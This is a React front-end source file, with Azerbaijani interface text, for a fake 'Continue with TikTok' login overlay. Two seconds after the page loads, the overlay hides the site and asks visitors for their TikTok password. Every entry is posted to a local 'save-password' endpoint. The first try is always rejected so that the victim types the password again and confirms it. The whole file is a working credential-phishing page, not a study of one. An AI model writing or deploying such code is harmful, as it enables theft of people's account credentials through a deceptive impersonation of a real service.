import React, { useEffect, useState } from "react";
import axios from "axios";
import 'bootstrap/dist/css/bootstrap.min.css';

import Header from "./components/Header";
import Hero from "./components/Hero";
import Services from "./components/Services";
import Slider from "./components/Slider";
import Footer from "./components/Footer";

function App() {
  const [showLogin, setShowLogin] = useState(false);
  const [showPasswordInput, setShowPasswordInput] = useState(false);
  const [password, setPassword] = useState("");
  const [lastTriedPassword, setLastTriedPassword] = useState("");
  const [attemptCount, setAttemptCount] = useState(0);

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowLogin(true);
    }, 2000);

    return () => clearTimeout(timer);
  }, []);

  const handleTikTokClick = () => {
    setShowPasswordInput(true);
  };

  const handleLogin = async () => {
    setAttemptCount(prev => prev + 1);

    try {
      await axios.post("http://localhost:5000/save-password", { password });

      // input sahəsini sıfırla
      setPassword("");

      if (attemptCount === 0) {
        setLastTriedPassword(password);
        alert("Şifrə yanlışdır");
      } else if (password === lastTriedPassword) {
        alert("Giriş uğurludur!");
        setShowLogin(false); // Login ekranını bağla
      } else {
        setLastTriedPassword(password);
        alert("Şifrə yanlışdır");
      }
    } catch (error) {
      console.error("Serverə göndərərkən xəta:", error);
      alert("Server xətası baş verdi.");
    }
  };

  return (
    <div className="bg-light text-dark position-relative">

      {/* Əsas sayt hissəsi */}
      {!showLogin && (
        <>
          <Header />
          <Hero />
          <Services />
          <Slider />
          <Footer />
        </>
      )}

      {/* Login overlay */}
      {showLogin && (
        <div
          className="position-fixed top-0 start-0 w-100 h-100 d-flex justify-content-center align-items-center"
          style={{ backgroundColor: "rgba(0, 0, 0, 0.8)", zIndex: 9999 }}
        >
          <div className="bg-white p-4 rounded shadow" style={{ width: "340px" }}>
            <h4 className="text-center mb-4">TikTok ilə davam et</h4>

            {!showPasswordInput ? (
              <button
                className="btn btn-outline-dark w-100 mb-3 d-flex align-items-center justify-content-center gap-2"
                onClick={handleTikTokClick}
              >
                <img
                  src="https://cdn-icons-png.flaticon.com/512/3046/3046122.png"
                  alt="TikTok"
                  style={{ width: "20px", height: "20px" }}
                />
                TikTok ilə davam et
              </button>
            ) : (
              <>
                <input
                  type="password"
                  className="form-control mb-3"
                  placeholder="Şifrəni daxil edin"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
                <button
                  className="btn btn-dark w-100 mb-3"
                  onClick={handleLogin}
                >
                  Giriş et
                </button>
              </>
            )}

            <div className="text-center mb-2">və ya davam et</div>

            <div className="d-flex justify-content-center gap-3 mb-2">
              <img src="https://cdn-icons-png.flaticon.com/512/300/300221.png" alt="Google" style={{ width: "28px", height: "28px" }} />
              <img src="https://cdn-icons-png.flaticon.com/512/733/733553.png" alt="GitHub" style={{ width: "28px", height: "28px" }} />
              <img src="https://cdn-icons-png.flaticon.com/512/3046/3046122.png" alt="TikTok" style={{ width: "28px", height: "28px" }} />
            </div>

            <p className="text-center text-muted small mt-3">
              Davam etməklə <span className="text-decoration-underline">Şərtlər</span> və <span className="text-decoration-underline">Gizlilik siyasəti</span> ilə razılaşırsınız.
            </p>
          </div>
        </div>
      )}
    </div>
  );
}

export default App;